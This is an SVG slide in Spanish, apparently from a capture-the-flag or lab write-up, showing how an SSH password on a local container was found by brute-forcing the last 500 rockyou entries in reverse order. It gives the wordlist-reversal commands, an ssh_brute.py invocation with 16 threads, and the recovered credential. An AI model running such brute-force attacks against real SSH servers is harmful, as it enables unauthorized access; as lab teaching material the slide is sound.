<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1240 620" width="1240" height="620">
  <style>
    .bg{fill:#0b1120}
    .panel{fill:#1e293b;stroke:#334155}
    .term{fill:#020617;stroke:#334155}
    .ttl{fill:#f8fafc;font:700 23px 'Segoe UI',system-ui,sans-serif}
    .sub{fill:#94a3b8;font:400 13px 'Segoe UI',system-ui,sans-serif}
    .h{fill:#f8fafc;font:700 13px 'Segoe UI',system-ui,sans-serif}
    .m{fill:#cbd5e1;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
    .mm{fill:#38bdf8;font:700 11.5px ui-monospace,Menlo,Consolas,monospace}
    .ok{fill:#22c55e;font:700 11.5px ui-monospace,Menlo,Consolas,monospace}
    .bad{fill:#ef4444;font:700 11.5px ui-monospace,Menlo,Consolas,monospace}
    .warn{fill:#f59e0b;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
    .note{fill:#94a3b8;font:400 11.5px 'Segoe UI',system-ui,sans-serif}
    .crit{fill:#ef4444;font:700 13px 'Segoe UI',system-ui,sans-serif}
    .tag{fill:#020617;font:700 10.5px 'Segoe UI',system-ui,sans-serif}
  </style>
  <rect class="bg" width="1240" height="620"/>
  <text class="ttl" x="20" y="38">El giro que resolvió la máquina: leer rockyou al revés</text>
  <text class="sub" x="20" y="60">El password no está al principio de la lista: está a 91 líneas del final</text>

  <!-- POSICIÓN -->
  <rect class="panel" x="20" y="84" width="600" height="300" rx="10" stroke="#ef4444" stroke-width="2"/>
  <text class="h" x="36" y="112">Posición real en rockyou</text>
  <rect class="term" x="36" y="124" width="568" height="104" rx="7"/>
  <text class="m" x="50" y="148">$ wc -l /usr/share/wordlists/rockyou.txt</text>
  <text class="m" x="50" y="168">14344392 /usr/share/wordlists/rockyou.txt</text>
  <text class="m" x="50" y="194">$ grep -n '3117548331' /usr/share/wordlists/rockyou.txt</text>
  <text class="bad" x="50" y="214">14344302: 3117548331     &lt;- a 91 líneas del final</text>

  <line x1="60" y1="286" x2="580" y2="286" stroke="#475569" stroke-width="4"/>
  <line x1="548" y1="286" x2="580" y2="286" stroke="#ef4444" stroke-width="8"/>
  <circle cx="574" cy="286" r="7" fill="#ef4444"/>
  <text class="note" x="60" y="310">línea 1</text>
  <text class="note" x="466" y="310">línea 14.344.392</text>
  <text class="bad" x="392" y="266">3117548331</text>

  <text class="ok" x="36" y="344">$ tail -n 500 rockyou.txt | tac | sed 's/ //g' | sed '/^$/d'</text>
  <text class="mm" x="36" y="366">Posición en la lista invertida: 88 (de 497)</text>

  <!-- ATAQUE -->
  <rect class="panel" x="636" y="84" width="584" height="300" rx="10" stroke="#22c55e" stroke-width="2"/>
  <text class="h" x="652" y="112" fill="#22c55e">Ataque dirigido (16 hilos)</text>
  <rect class="term" x="652" y="124" width="552" height="176" rx="7"/>
  <text class="m" x="666" y="148">$ tail -n 500 rockyou.txt | tac | sed 's/ //g' &gt; rev.txt</text>
  <text class="m" x="666" y="170">$ python3 tools/ssh_brute.py -H 172.17.0.2 \</text>
  <text class="m" x="666" y="190">      -u tails -P rev.txt -t 16</text>
  <text class="ok" x="666" y="242">[+] CREDENCIAL ENCONTRADA:</text>
  <text class="ok" x="666" y="262">    tails / 3117548331</text>
  <text class="ok" x="666" y="286">[*] 96 intentos en 21,6 s (4/s)</text>
  <text class="note" x="666" y="334">El techo con 16 hilos es ~4,5 intentos/s: cada fallo cuesta 3,59 s.</text>
  <text class="note" x="666" y="352">Los 96 intentos sólo son viables porque la posición es la 88.</text>
  <text class="note" x="666" y="370">Con el orden natural habrían sido 14,3 millones de intentos.</text>

  <!-- LECCIÓN -->
  <rect class="panel" x="20" y="404" width="1200" height="182" rx="10"/>
  <text class="crit" x="36" y="432">Por qué el plan curado no bastaba</text>
  <text class="note" x="36" y="456">La lista curada (temática + estilo del autor + xato + rockyou top 150k + español) reunía 143.928 candidatos.</text>
  <text class="note" x="36" y="474">A 20 intentos/s habría tardado unas 2 horas, y aun así el password no estaba incluido: vivía en la cola de rockyou.</text>
  <text class="note" x="36" y="492">La lección no es "más diccionario", sino mirar también el final de la lista: las contraseñas poco probables se eligen</text>
  <text class="note" x="36" y="510">precisamente por estar fuera de los primeros puestos.</text>
  <text class="ok" x="36" y="540">Comando reproducible:</text>
  <text class="mm" x="36" y="560">tail -n 500 /usr/share/wordlists/rockyou.txt | tac | sed 's/ //g' | sed '/^$/d' &gt; wordlists/passwords_reversed_500.txt</text>
  <text class="mm" x="36" y="580">python3 tools/ssh_brute.py -H 172.17.0.2 -u tails -P wordlists/passwords_reversed_500.txt -t 16</text>
</svg>
